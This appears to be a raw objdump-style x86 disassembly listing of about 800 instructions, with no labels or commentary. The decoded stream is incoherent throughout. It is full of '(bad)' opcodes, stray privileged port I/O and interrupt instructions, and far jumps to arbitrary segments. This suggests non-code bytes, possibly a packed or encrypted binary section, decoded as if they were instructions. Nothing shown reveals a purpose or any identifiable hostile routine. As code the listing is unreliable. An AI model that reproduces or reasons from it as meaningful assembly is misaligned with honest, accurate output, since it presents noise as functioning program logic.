  4189d0:	jp     0x41897e
  4189d2:	pop    esi
  4189d3:	add    ebp,ebp
  4189d5:	push   ecx
  4189d6:	cmp    bh,BYTE PTR [eax]
  4189d8:	xlat   BYTE PTR ds:[ebx]
  4189d9:	fxch   st(6)
  4189db:	xchg   BYTE PTR ds:0xc44c4ef9,ah
  4189e1:	push   0x43408e08
  4189e6:	mov    dh,dh
  4189e8:	mov    esi,DWORD PTR [edi+0x4158f587]
  4189ee:	stos   DWORD PTR es:[edi],eax
  4189ef:	mov    esi,0x3a4646fd
  4189f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189f5:	bound  ecx,QWORD PTR [esi-0x3542d40b]
  4189fb:	inc    edx
  4189fc:	cwde   
  4189fd:	ret    0x7b21
  418a00:	retf   0xcf02
  418a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a04:	les    ecx,FWORD PTR [ebx]
  418a06:	add    eax,0xb844fe38
  418a0b:	xchg   esi,eax
  418a0c:	mov    ecx,0xa1e5441b
  418a11:	cmp    eax,0xda9e012c
  418a16:	dec    eax
  418a17:	mov    DWORD PTR [esi-0x18],edx
  418a1a:	fstp   DWORD PTR [esi]
  418a1c:	fild   WORD PTR [ebx]
  418a1e:	cmp    eax,0x17733e77
  418a23:	xor    al,0x6e
  418a25:	lock push 0x47
  418a28:	pop    ecx
  418a29:	ss xchg edx,eax
  418a2b:	(bad)  
  418a2c:	in     eax,dx
  418a2d:	sub    edi,edi
  418a2f:	enter  0xf57a,0x4e
  418a33:	std    
  418a34:	dec    esp
  418a35:	jns    0x4189be
  418a37:	xor    cl,ah
  418a39:	in     al,dx
  418a3a:	xlat   BYTE PTR ds:[ebx]
  418a3b:	aad    0xe6
  418a3d:	jg     0x418a6d
  418a3f:	jge    0x418ab1
  418a41:	pop    ebp
  418a42:	inc    edi
  418a43:	loop   0x418aa3
  418a45:	jmp    0xc49c:0xbc8ba717
  418a4c:	rol    DWORD PTR [ebx+edi*8-0x67153125],0x70
  418a54:	pop    esi
  418a55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a56:	adc    al,BYTE PTR [edi]
  418a58:	jp     0x418a0a
  418a5a:	push   0x70749a86
  418a5f:	and    dl,cl
  418a61:	jae    0x418a84
  418a63:	push   ebp
  418a64:	cmp    BYTE PTR [edx],bl
  418a66:	cmp    al,0xe9
  418a68:	pop    ebx
  418a69:	out    dx,al
  418a6a:	shr    DWORD PTR [eax+0x30],cl
  418a6d:	or     eax,DWORD PTR [ebp-0x7ded9629]
  418a73:	xchg   ebp,eax
  418a74:	enter  0x6220,0xdf
  418a78:	iret   
  418a79:	clc    
  418a7a:	dec    ecx
  418a7b:	sub    BYTE PTR [esi],ah
  418a7d:	add    BYTE PTR [esi+edx*4],0x5a
  418a81:	dec    eax
  418a82:	sub    al,0x34
  418a84:	cld    
  418a85:	xchg   ebp,eax
  418a86:	dec    ecx
  418a87:	jl     0x418a3b
  418a89:	dec    ebp
  418a8a:	scas   al,BYTE PTR es:[edi]
  418a8b:	cdq    
  418a8c:	pop    esp
  418a8d:	hlt    
  418a8e:	call   0x74d7:0xca7c938a
  418a95:	outs   dx,DWORD PTR ds:[esi]
  418a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a97:	mov    bh,0x67
  418a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a9a:	scas   eax,DWORD PTR es:[edi]
  418a9b:	push   ebx
  418a9c:	fs add cl,ah
  418a9f:	xlat   BYTE PTR ds:[ebx]
  418aa0:	in     al,0x64
  418aa2:	sar    BYTE PTR [ebx-0x12026fe4],cl
  418aa8:	mov    BYTE PTR [ebx+ebx*8-0x274c79ab],dl
  418aaf:	lahf   
  418ab0:	test   DWORD PTR [esi+edx*4],esi
  418ab3:	mov    esp,0xfc1ec84
  418ab8:	mov    bh,0xe9
  418aba:	leavew 
  418abc:	rcl    DWORD PTR [ebp+0x27d7ac37],cl
  418ac2:	test   DWORD PTR [ebx+0x10c0ed5e],esp
  418ac8:	test   BYTE PTR ds:0x5c2bac08,al
  418ace:	mov    edx,0x72d20c3
  418ad3:	pop    edx
  418ad4:	lea    esp,[ecx+edi*4]
  418ad7:	sbb    DWORD PTR [esi+edi*1],0x266be8ce
  418ade:	scas   al,BYTE PTR es:[edi]
  418adf:	gs cld 
  418ae1:	rol    DWORD PTR [ebp-0x60928a38],0xb2
  418ae8:	sub    al,0x21
  418aea:	fdivp  st(5),st
  418aec:	sbb    dl,al
  418aee:	dec    ecx
  418aef:	inc    edx
  418af0:	adc    al,0xf5
  418af2:	add    DWORD PTR ds:0xf18bb448,ebp
  418af8:	in     al,dx
  418af9:	add    eax,DWORD PTR [ebx+0x53dd1a07]
  418aff:	push   ebp
  418b00:	iret   
  418b01:	mov    al,0x51
  418b03:	xor    eax,0xaeb82b51
  418b08:	mov    cs,edi
  418b0a:	jns    0x418a9e
  418b0c:	into   
  418b0d:	or     eax,0xa0db59c6
  418b12:	mov    esp,0x321305e8
  418b17:	repz ret 
  418b19:	loope  0x418b24
  418b1b:	cmp    DWORD PTR fs:[edx],ecx
  418b1e:	mov    ecx,0x8618816c
  418b23:	fmul   QWORD PTR [ebp+ebx*2-0x74488d03]
  418b2a:	inc    ecx
  418b2b:	sbb    ch,ch
  418b2d:	mov    ds:0x34c0e2a3,al
  418b32:	stc    
  418b33:	pop    es
  418b34:	adc    eax,0x2e75399e
  418b39:	sbb    al,BYTE PTR [ebp-0x59e85f58]
  418b3f:	jl     0x418b9d
  418b41:	data16 sbb bh,al
  418b44:	(bad)  
  418b45:	int    0x47
  418b47:	jne    0x418b5a
  418b49:	nop
  418b4a:	or     bl,bh
  418b4c:	or     DWORD PTR [ebx-0x6a09d8d5],0x6950393b
  418b56:	mov    bl,0x4f
  418b58:	mov    al,0xe5
  418b5a:	outs   dx,BYTE PTR ds:[esi]
  418b5b:	mov    bh,0x23
  418b5d:	and    BYTE PTR [esi],ch
  418b5f:	add    ecx,edi
  418b61:	int3   
  418b62:	mov    edx,0xd8f376e9
  418b67:	adc    al,0x8e
  418b69:	push   0xb84860de
  418b6e:	push   esi
  418b6f:	adc    DWORD PTR [ebp-0x397239a5],ecx
  418b75:	mov    ch,0x8b
  418b77:	adc    BYTE PTR [edx],ch
  418b79:	xor    edx,eax
  418b7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b7c:	sub    al,0x34
  418b7e:	loop   0x418bb1
  418b80:	stos   DWORD PTR es:[edi],eax
  418b81:	mov    WORD PTR [ecx],?
  418b83:	int    0x4a
  418b85:	mov    bl,0x91
  418b87:	mov    ch,0xcf
  418b89:	fwait
  418b8a:	cmp    DWORD PTR [ecx],eax
  418b8c:	adc    ecx,edx
  418b8e:	push   ebx
  418b8f:	and    DWORD PTR [eax+edi*1+0x49e1f229],0x46
  418b97:	pop    es
  418b98:	jne    0x418ba9
  418b9a:	ss inc ebx
  418b9c:	retf   
  418b9d:	inc    BYTE PTR [edi]
  418b9f:	stos   BYTE PTR es:[di],al
  418ba1:	mov    edi,0x41dad2c4
  418ba6:	test   DWORD PTR [ebx-0x1f],0x3ac850c4
  418bad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bae:	loope  0x418b4e
  418bb0:	repz (bad) 
  418bb2:	mov    bh,0xed
  418bb5:	add    bl,BYTE PTR [ebp-0x7ca1beb]
  418bbb:	adc    BYTE PTR [esi+ebx*2],dh
  418bbe:	out    0xd,eax
  418bc0:	mov    al,ds:0x6a69c086
  418bc5:	add    BYTE PTR [edi],ch
  418bc7:	scas   al,BYTE PTR es:[edi]
  418bc8:	cld    
  418bc9:	popa   
  418bca:	xchg   ebx,eax
  418bcb:	in     al,0xaf
  418bcd:	sti    
  418bce:	add    ebx,DWORD PTR [ebx]
  418bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bd1:	push   ds
  418bd2:	repz ja 0x418bd5
  418bd5:	lds    eax,FWORD PTR [ebp+0x26]
  418bd8:	and    al,0x8d
  418bda:	dec    ecx
  418bdb:	gs push ds
  418bdd:	ret    0x9f34
  418be0:	mov    esi,0x3fa780a5
  418be5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418be7:	or     cl,0xb8
  418bea:	mov    ebx,0x6b60a04e
  418bef:	push   edi
  418bf0:	cmovp  edi,DWORD PTR [edi+eax*1+0x59044c31]
  418bf8:	inc    edx
  418bf9:	add    ecx,ebp
  418bfb:	or     dl,BYTE PTR [ebp+ebp*2-0xfca9125]
  418c02:	dec    edx
  418c03:	inc    edx
  418c04:	sbb    al,cl
  418c06:	leave  
  418c07:	ret    
  418c08:	sahf   
  418c09:	jg     0x418b8b
  418c0b:	jle    0x418bd1
  418c0d:	pop    ss
  418c0e:	xchg   ebp,eax
  418c0f:	jbe    0x418ba3
  418c11:	clc    
  418c12:	(bad)  [ebp+ebx*2-0x1aa94e6f]
  418c19:	add    esi,esp
  418c1b:	pusha  
  418c1c:	mov    al,ss:0x9d535bd
  418c22:	cmp    BYTE PTR [esi],cl
  418c24:	cmp    al,ah
  418c26:	call   0xb4073146
  418c2b:	xor    edi,DWORD PTR [ecx]
  418c2d:	sub    BYTE PTR [esi-0x1a015b1c],0xc9
  418c34:	pop    edx
  418c35:	fiadd  WORD PTR [ecx]
  418c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c38:	nop
  418c39:	mov    edi,0xd948c7b2
  418c3e:	sti    
  418c3f:	cmp    edi,DWORD PTR [ecx-0x7d]
  418c42:	cmp    eax,0x57ddb735
  418c47:	popa   
  418c48:	ins    BYTE PTR es:[edi],dx
  418c49:	push   edi
  418c4a:	push   edx
  418c4b:	xchg   edi,eax
  418c4c:	test   DWORD PTR [edx-0x7e],eax
  418c4f:	nop
  418c50:	push   esi
  418c51:	add    edx,DWORD PTR [ebx+0x21]
  418c54:	and    ebx,DWORD PTR [ecx-0x4ec28bce]
  418c5a:	or     DWORD PTR [esi+0x35f6d813],0x5c94ffbc
  418c64:	cld    
  418c65:	push   edx
  418c66:	dec    eax
  418c67:	arpl   cx,ax
  418c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c6a:	or     dh,BYTE PTR [eax+0x7bcdf24a]
  418c70:	das    
  418c71:	mov    ds:0xe8322179,al
  418c76:	sbb    eax,0xec3892f9
  418c7b:	push   ecx
  418c7c:	stos   DWORD PTR es:[edi],eax
  418c7d:	xchg   ebp,eax
  418c7e:	pop    esp
  418c7f:	fucomi st,st(3)
  418c81:	dec    ebx
  418c82:	jmp    0xf98514db
  418c87:	inc    edi
  418c88:	pop    es
  418c89:	inc    ebx
  418c8a:	je     0x418c6d
  418c8c:	(bad)  
  418c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c8e:	outs   dx,DWORD PTR ds:[esi]
  418c8f:	aaa    
  418c90:	ret    0x2a6c
  418c93:	leave  
  418c94:	inc    BYTE PTR [edx+0x5f]
  418c97:	add    DWORD PTR ds:0xd7ac3861,ebp
  418c9d:	arpl   WORD PTR [ecx],bx
  418c9f:	inc    ecx
  418ca0:	push   ebp
  418ca1:	pusha  
  418ca2:	mov    esp,0xb0a5dbd5
  418ca7:	loop   0x418ca5
  418ca9:	div    BYTE PTR ss:[esi+0x2]
  418cad:	jmp    0xd7818117
  418cb2:	hlt    
  418cb3:	ror    DWORD PTR [eax+0x17],cl
  418cb6:	dec    esp
  418cb7:	fadd   DWORD PTR [edx]
  418cb9:	imul   edx
  418cbb:	sar    dl,cl
  418cbd:	add    dh,BYTE PTR [esi+edx*4]
  418cc0:	jp     0x418c76
  418cc2:	mov    ch,0x99
  418cc4:	or     ecx,DWORD PTR ds:0xa7aeb5a4
  418cca:	call   0x40b8:0xec1e111f
  418cd1:	mov    ah,0xac
  418cd3:	or     ebp,DWORD PTR [edx]
  418cd5:	outs   dx,BYTE PTR ds:[esi]
  418cd6:	loope  0x418c94
  418cd8:	mov    bl,BYTE PTR [eax+0x5a]
  418cdb:	cdq    
  418cdc:	dec    esp
  418cdd:	mov    cs,WORD PTR [eax]
  418cdf:	lods   al,BYTE PTR ds:[esi]
  418ce0:	push   ecx
  418ce1:	push   ds
  418ce2:	je     0x418ca4
  418ce4:	ja     0x418d11
  418ce6:	push   ss
  418ce7:	add    ebp,ebx
  418ce9:	mov    dh,0x34
  418ceb:	mov    esp,0x4ca6e7c4
  418cf0:	out    0x4b,eax
  418cf2:	mov    al,0xb3
  418cf4:	pop    esi
  418cf5:	fldenv [esi]
  418cf7:	sub    DWORD PTR [ecx],0xffffff82
  418cfa:	mov    bh,0x4e
  418cfc:	shl    BYTE PTR [ebx+esi*4-0x73],cl
  418d00:	xchg   esp,eax
  418d01:	pop    ds
  418d02:	ror    esi,cl
  418d04:	pop    ebx
  418d05:	int    0x0
  418d07:	outs   dx,DWORD PTR ds:[esi]
  418d08:	inc    ebp
  418d09:	xlat   BYTE PTR ds:[ebx]
  418d0a:	call   0x2dc2:0xa6ad2f2c
  418d11:	or     bh,BYTE PTR [ebp-0x56e1188a]
  418d17:	repnz xchg dh,ch
  418d1a:	mov    ds:0x2bfb388f,eax
  418d1f:	hlt    
  418d20:	in     al,dx
  418d21:	aam    0x54
  418d23:	fist   WORD PTR [edx+0x5f]
  418d27:	mov    ebp,DWORD PTR [edx+0x3f]
  418d2a:	add    DWORD PTR fs:[esi+0x75147255],edi
  418d31:	fiadd  WORD PTR [eax+0x3e]
  418d34:	jne    0x418d1b
  418d36:	mov    dh,al
  418d38:	pop    esi
  418d39:	aam    0x38
  418d3b:	cmc    
  418d3c:	jg     0x418cd9
  418d3e:	fisttp QWORD PTR [ebx-0x6c]
  418d41:	cmp    esp,DWORD PTR [eax-0x3baadea8]
  418d47:	out    dx,eax
  418d48:	aaa    
  418d49:	mov    esi,0xf8d946f2
  418d4e:	xchg   edx,esi
  418d50:	cmp    eax,ecx
  418d52:	out    dx,eax
  418d53:	sbb    BYTE PTR [edx],0x76
  418d56:	sahf   
  418d57:	popf   
  418d58:	jmp    0x3af64984
  418d5d:	mov    edx,0xf786c977
  418d62:	mov    eax,ds:0xcd92e2ee
  418d67:	sbb    eax,0xf614f75
  418d6c:	dec    edx
  418d6d:	inc    BYTE PTR [esi+0x672a3e19]
  418d73:	add    al,0x12
  418d75:	add    bl,dh
  418d77:	jp     0x418d81
  418d79:	cmp    BYTE PTR [ebx+0x13124699],bl
  418d7f:	xchg   ecx,eax
  418d80:	inc    ebp
  418d81:	clc    
  418d82:	sub    ebp,ebx
  418d84:	mov    BYTE PTR [eax+0xeec29e0],dl
  418d8a:	out    0xb7,al
  418d8c:	xor    BYTE PTR [ebp+ecx*8-0x5d249f34],ch
  418d93:	jb     0x418da8
  418d95:	push   ds
  418d96:	push   ss
  418d97:	repz hlt 
  418d99:	inc    edx
  418d9a:	sub    esi,esp
  418d9c:	das    
  418d9d:	adc    eax,0x17a51db6
  418da2:	lahf   
  418da3:	inc    ebx
  418da4:	inc    edi
  418da5:	mov    bl,0x5e
  418da7:	mov    al,0x8d
  418da9:	cdq    
  418daa:	add    al,0xa3
  418dac:	adc    BYTE PTR [eax-0x1a3bb58],cl
  418db2:	in     eax,dx
  418db3:	mov    ch,0x3c
  418db5:	jecxz  0x418e15
  418db7:	cmp    DWORD PTR [ebx-0x52aa1d3a],esp
  418dbd:	inc    edx
  418dbe:	addr16 ds into 
  418dc1:	push   esi
  418dc2:	xchg   ebx,eax
  418dc3:	xchg   esp,eax
  418dc4:	in     eax,dx
  418dc5:	sbb    eax,0x348d534
  418dca:	mov    eax,ds:0x771d82e8
  418dcf:	pop    cx
  418dd1:	mov    ds:0x558b2903,al
  418dd6:	mov    bl,0xf3
  418dd8:	pop    eax
  418dd9:	inc    esi
  418dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ddb:	mov    al,ds:0x3a430d2a
  418de0:	mov    ebx,0xafa32060
  418de5:	loopne 0x418e3f
  418de7:	jmp    0x5ed9cd5a
  418dec:	lods   eax,DWORD PTR ds:[esi]
  418ded:	sti    
  418dee:	sbb    BYTE PTR [ebp+0x7e],ah
  418df1:	xor    al,0x10
  418df3:	sub    eax,DWORD PTR [ebp-0x50]
  418df6:	cs pusha 
  418df8:	mov    dh,0x47
  418dfa:	add    al,bh
  418dfc:	fwait
  418dfd:	mov    esp,0xa85b9ce2
  418e02:	pushf  
  418e03:	out    0xa,eax
  418e05:	icebp  
  418e06:	mov    ebp,0x8ea8ae49
  418e0b:	cs scas eax,DWORD PTR es:[edi]
  418e0d:	jbe    0x418d9f
  418e0f:	inc    eax
  418e10:	mov    WORD PTR [edi-0x306e0ca1],ss
  418e16:	dec    ecx
  418e17:	mov    DWORD PTR [edi+ebp*1],esp
  418e1a:	fmul   QWORD PTR [eax]
  418e1c:	fidiv  WORD PTR [ebp+esi*4-0x76a3f6ba]
  418e23:	gs mov bh,0xc5
  418e26:	and    al,0xba
  418e28:	dec    edx
  418e29:	and    al,0x8a
  418e2b:	or     ecx,ebx
  418e2d:	and    eax,0x3b28bb71
  418e32:	call   0x3472:0x14897a70
  418e39:	xor    esi,DWORD PTR [ecx+0x23]
  418e3c:	mov    ecx,0xfdb1896c
  418e41:	mul    DWORD PTR [ebx-0x48]
  418e44:	aaa    
  418e45:	mov    bh,0xa6
  418e47:	loopne 0x418dcb
  418e49:	push   ebx
  418e4a:	cmp    cl,BYTE PTR [edx]
  418e4c:	jmp    0x4e57:0xcb5db88f
  418e53:	push   ebx
  418e54:	sti    
  418e55:	xchg   edi,eax
  418e56:	das    
  418e57:	imul   esi,DWORD PTR [eax+0x1d],0x8a225c15
  418e5e:	mov    ?,WORD PTR [ecx-0xe]
  418e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e62:	jle    0x418e0d
  418e64:	ds dec eax
  418e66:	dec    edi
  418e67:	xor    dl,BYTE PTR [edi+0x575d2301]
  418e6d:	std    
  418e6e:	xor    DWORD PTR [eax],0xc03c9f77
  418e74:	out    0xbb,al
  418e76:	repz xchg ecx,eax
  418e78:	fs jbe 0x418ed2
  418e7b:	mov    edi,DWORD PTR [esp+ebp*2]
  418e7e:	mov    eax,0xb63e5acc
  418e83:	ins    DWORD PTR es:[edi],dx
  418e84:	hlt    
  418e85:	aas    
  418e86:	xchg   ebx,eax
  418e87:	mov    al,ds:0x3f61d804
  418e8c:	mov    bl,0x45
  418e8e:	mov    ebp,0xef338ae3
  418e93:	gs inc edx
  418e95:	add    DWORD PTR [edi+0x3dc8c6a2],esp
  418e9b:	call   DWORD PTR [ebx+0x73af3883]
  418ea1:	lds    edx,FWORD PTR [eax+0x482a7a38]
  418ea7:	pop    ds
  418ea8:	cmp    ch,BYTE PTR [ebx+0x44ec4ffe]
  418eae:	cwde   
  418eaf:	aas    
  418eb0:	jg     0x418ead
  418eb2:	push   edi
  418eb3:	ret    0xe14b
  418eb6:	inc    edx
  418eb7:	(bad)  
  418eb8:	fcmove st,st(1)
  418eba:	daa    
  418ebb:	or     al,0xfb
  418ebd:	xchg   ecx,eax
  418ebe:	(bad)  
  418ebf:	loopne 0x418f31
  418ec1:	xor    DWORD PTR [eax+ebp*2],0xbb2d3923
  418ec8:	cmp    ch,bh
  418eca:	pusha  
  418ecb:	xor    dh,ah
  418ecd:	jnp    0x418f4d
  418ecf:	jo     0x418ec7
  418ed1:	dec    ecx
  418ed2:	pop    ss
  418ed3:	push   esi
  418ed5:	push   ebx
  418ed6:	jns    0x418f4e
  418ed8:	lea    edi,fs:[esi+0x31]
  418edc:	retf   
  418edd:	(bad)  [ecx+0x77aabae9]
  418ee3:	push   es
  418ee4:	jne    0x418f05
  418ee6:	lahf   
  418ee7:	xor    eax,0xaa019068
  418eec:	shl    DWORD PTR ds:0xf2ede8d1,1
  418ef2:	and    esi,0x0
  418ef5:	cmp    DWORD PTR [eax+ecx*8-0x5e],edx
  418ef9:	jl     0x418ef1
  418efb:	aaa    
  418efc:	popf   
  418efd:	popf   
  418efe:	pop    ds
  418eff:	ins    BYTE PTR es:[edi],dx
  418f00:	inc    eax
  418f01:	mov    edx,0xb32b6f9d
  418f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f07:	push   cs
  418f08:	jae    0x418e94
  418f0a:	idiv   DWORD PTR [edx]
  418f0c:	icebp  
  418f0d:	xor    ecx,edx
  418f0f:	or     esi,DWORD PTR [edx]
  418f11:	add    ecx,ebp
  418f13:	shl    DWORD PTR [edi-0x1e],0xea
  418f17:	aas    
  418f18:	mov    edi,?
  418f1a:	cmp    ebp,DWORD PTR [esi-0x25]
  418f1d:	dec    edi
  418f1e:	jp     0x418f6e
  418f20:	mov    eax,ds:0x75ac5554
  418f25:	dec    esp
  418f26:	push   ebx
  418f27:	call   0xe51c:0xb928fc9e
  418f2e:	and    ch,cl
  418f30:	cmp    esp,DWORD PTR [ebp-0x49bdb339]
  418f36:	aam    0xdd
  418f38:	mov    al,ds:0x2a1a4413
  418f3d:	inc    ebp
  418f3e:	std    
  418f3f:	scas   eax,DWORD PTR es:[edi]
  418f40:	mov    ah,0xe3
  418f42:	mov    DWORD PTR [ebp+0x343f0fe6],edi
  418f48:	and    esp,DWORD PTR [edx-0x35a69666]
  418f4e:	or     DWORD PTR [edx+ecx*1],eax
  418f51:	stos   BYTE PTR es:[edi],al
  418f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f53:	cmp    al,0x80
  418f55:	outs   dx,BYTE PTR ds:[esi]
  418f56:	les    edx,FWORD PTR [esi]
  418f58:	pop    es
  418f59:	push   edx
  418f5a:	pushf  
  418f5b:	push   ecx
  418f5c:	aaa    
  418f5d:	mov    dl,0xcc
  418f5f:	mov    ah,0x0
  418f61:	iret   
  418f62:	aam    0xb2
  418f64:	sbb    BYTE PTR [edx],al
  418f66:	dec    esi
  418f67:	cli    
  418f68:	popf   
  418f69:	xor    cl,0x30
  418f6c:	ficom  WORD PTR [edx+0x7f]
  418f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f70:	mov    ch,BYTE PTR ds:0xecc91f8d
  418f76:	xchg   edi,eax
  418f77:	xchg   esi,eax
  418f78:	pop    edi
  418f79:	jmp    0x25bf:0xa22ca3b1
  418f80:	ret    
  418f81:	scas   eax,DWORD PTR es:[edi]
  418f82:	stos   BYTE PTR es:[edi],al
  418f83:	push   eax
  418f84:	dec    edi
  418f85:	and    edi,DWORD PTR [ebx+0x6d31584f]
  418f8b:	add    ebx,esi
  418f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f8e:	pop    esp
  418f90:	fs jl  0x418f5f
  418f93:	sub    cl,bl
  418f95:	out    dx,al
  418f96:	lods   eax,DWORD PTR ds:[esi]
  418f97:	mov    dl,0x8f
  418f99:	push   ecx
  418f9a:	sbb    eax,edx
  418f9c:	les    esi,FWORD PTR fs:[ecx+0x71539c46]
  418fa3:	xor    DWORD PTR [ecx+0x2b9a822b],esi
  418fa9:	and    cl,al
  418fab:	jl     0x418fd5
  418fad:	adc    DWORD PTR [ebx-0x3f7e3cbc],esi
  418fb3:	mov    bh,0xfe
  418fb5:	mov    cl,0x6f
  418fb7:	test   DWORD PTR ds:0x2f4b4476,ecx
  418fbd:	mov    esp,0xa0c50e49
  418fc2:	xchg   ebx,eax
  418fc3:	mov    edi,0xfc191772
  418fc8:	adc    al,0x41
  418fca:	push   es
  418fcb:	scas   eax,DWORD PTR es:[edi]
  418fcc:	push   esp
  418fcd:	fnstenv [ebx]
  418fcf:	adc    BYTE PTR [eax-0x30],0xb9
  418fd3:	rcr    BYTE PTR [edx-0x30e9e5a4],0x8c
  418fda:	scas   eax,DWORD PTR es:[edi]
  418fdb:	scas   eax,DWORD PTR es:[edi]
  418fdc:	xchg   ebp,eax
  418fdd:	mov    esp,0x91efe5da
  418fe2:	clc    
  418fe3:	mov    al,ds:0x299eefba
  418fe8:	or     edx,edi
  418fea:	pop    ds
  418feb:	sbb    bh,0xe9
  418fee:	xor    eax,0xbed02201
  418ff3:	inc    ecx
  418ff4:	popa   
  418ff5:	push   0xffffffd8
  418ff7:	out    dx,eax
  418ff8:	mov    al,ds:0xcb28bc9e
  418ffd:	sbb    DWORD PTR [ebp+edx*8+0x6095af04],ebx
  419004:	or     DWORD PTR [esi+0x5883852],0xe8e0189e
  41900e:	sub    ebx,esp
  419010:	rcl    bl,0x67
  419013:	rcl    DWORD PTR [esi],0x6e
  419016:	ins    DWORD PTR es:[edi],dx
  419017:	(bad)  
  419018:	xor    DWORD PTR gs:[ecx-0x32fddeef],0xd3b92c8f
  419023:	nop
  419024:	daa    
  419025:	mov    al,0x22
  419027:	fcomp  DWORD PTR [ebx-0x4c]
  41902a:	inc    ebp
  41902b:	int    0xff
  41902d:	and    dl,BYTE PTR [edi+edx*2]
  419030:	adc    dh,dh
  419032:	mov    ah,0x41
  419034:	std    
  419035:	pop    edx
  419036:	fnstenv [ecx]
  419038:	cmp    al,0xff
  41903a:	cmp    esi,edx
  41903c:	adc    edi,edi
  41903e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41903f:	ret    
  419040:	add    DWORD PTR [esi],eax
  419042:	shl    ah,cl
  419044:	cmp    ecx,DWORD PTR [edi+0x4]
  419047:	shl    al,1
  419049:	push   esp
  41904a:	aas    
  41904b:	inc    esi
  41904c:	pop    edi
  41904d:	sub    ecx,DWORD PTR [esi-0x58]
  419050:	and    eax,0x582bfdce
  419055:	mov    ebx,0xa6016ed9
  41905a:	in     al,0x1f
  41905c:	mov    eax,ds:0x88a14e80
  419061:	push   es
  419062:	push   0xab88bdfd
  419067:	cdq    
  419068:	outs   dx,BYTE PTR ds:[esi]
  419069:	lods   al,BYTE PTR ds:[esi]
  41906a:	lods   al,BYTE PTR ds:[esi]
  41906b:	popa   
  41906c:	les    esp,FWORD PTR [edx-0x25]
  41906f:	sbb    DWORD PTR [bp+si],0xf1d68f50
  419076:	out    0x59,eax
  419078:	xchg   edi,eax
  419079:	aas    
  41907a:	pop    ds
  41907b:	adc    DWORD PTR [ecx+edi*4+0x71],eax
  41907f:	or     al,0xc6
  419081:	ins    BYTE PTR es:[edi],dx
  419082:	mov    ds:0xcb4cb570,eax
  419087:	mov    eax,ds:0xc79a876e
  41908c:	aaa    
  41908d:	xor    al,0x6e
  41908f:	fstp   QWORD PTR [eax+0x9664008]
  419095:	mov    cl,0x42
  419097:	fs stos BYTE PTR es:[edi],al
  419099:	add    DWORD PTR [ebx+0x3e],edi
  41909c:	pop    esp
  41909d:	dec    edx
  41909e:	pop    ecx
  41909f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190a0:	or     ah,ch
  4190a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190a3:	pop    esi
  4190a4:	icebp  
  4190a5:	sti    
  4190a6:	sub    dl,bh
  4190a8:	sti    
  4190a9:	mov    ebp,0x49627965
  4190ae:	mov    ebp,0x4569cd92
  4190b3:	xor    BYTE PTR [edx+0xa],0x98
  4190b7:	imul   edx,DWORD PTR [ecx+0x44],0xed3f9403
  4190be:	inc    ecx
  4190bf:	dec    edi
  4190c0:	mov    ds:0x6e89b311,eax
  4190c5:	xor    BYTE PTR [ebp+0x63],ah
  4190c8:	and    BYTE PTR [ebx-0x54],0x16
  4190cc:	jo     0x419066
  4190ce:	outs   dx,DWORD PTR ds:[esi]
  4190cf:	sbb    eax,0x97dfe282
  4190d4:	push   ds
  4190d5:	addr16 test esi,eax
  4190d8:	jno    0x419080
  4190da:	ffree  st(1)
  4190dc:	jmp    0xb1e1:0x563c4a8d
  4190e3:	rol    ebp,cl
  4190e5:	rcr    eax,cl
  4190e7:	xlat   BYTE PTR ds:[ebx]
  4190e8:	ins    BYTE PTR es:[edi],dx
  4190e9:	adc    eax,0xaf0b6fcc
  4190ee:	enter  0x73d4,0x87
  4190f2:	cmc    
  4190f3:	mov    al,0xc0
  4190f5:	popf   
  4190f6:	push   ebx
  4190f7:	push   es
  4190f8:	mov    ch,0xa7
  4190fa:	ret    0xa4d5
  4190fd:	mov    esi,0x6a0e9a2b
  419102:	daa    
  419103:	cmp    DWORD PTR [edi-0x41f09929],edi
  419109:	sub    al,0x2c
  41910b:	dec    edx
  41910c:	xchg   DWORD PTR gs:[edx],ecx
  41910f:	xor    eax,0xa6bd0e2
  419114:	out    dx,eax
  419115:	in     eax,dx
  419116:	pushf  
  419117:	hlt    
  419118:	(bad)  
  419119:	dec    ecx
  41911a:	test   BYTE PTR [edi+0x13fc79a],ch
  419120:	pop    ebx
  419121:	add    al,0xa5
  419123:	enter  0x952,0x36
  419127:	xor    eax,DWORD PTR [ecx+0x7a]
  41912a:	push   edi
  41912b:	adc    esp,0x7b
  41912e:	cli    
  41912f:	cs or  al,0xfd
  419132:	mov    esi,eax
  419134:	cmp    ecx,0xf9c2b1c0
  41913a:	mov    eax,ds:0x15f46a60
  41913f:	shl    dh,cl
  419141:	in     al,0x25
  419143:	jle    0x4190f8
  419145:	jno    0x4190f0
  419147:	aaa    
  419148:	test   al,0x68
  41914a:	(bad)  
  41914b:	in     al,dx
  41914c:	fwait
  41914d:	xor    BYTE PTR [ecx-0x91ec504],0xbd
  419154:	cmc    
  419155:	in     al,dx
  419156:	mov    dl,0x70
  419158:	out    dx,al
  419159:	lds    esp,FWORD PTR [ebp-0x4f]
  41915c:	lods   eax,DWORD PTR ds:[esi]
  41915d:	fucomi st,st(1)
  41915f:	bound  edx,QWORD PTR [ebx]
  419161:	push   ecx
  419162:	sub    eax,0x2208b2d8
  419167:	mov    dh,0xc
  419169:	ins    BYTE PTR es:[edi],dx
  41916a:	(bad)  
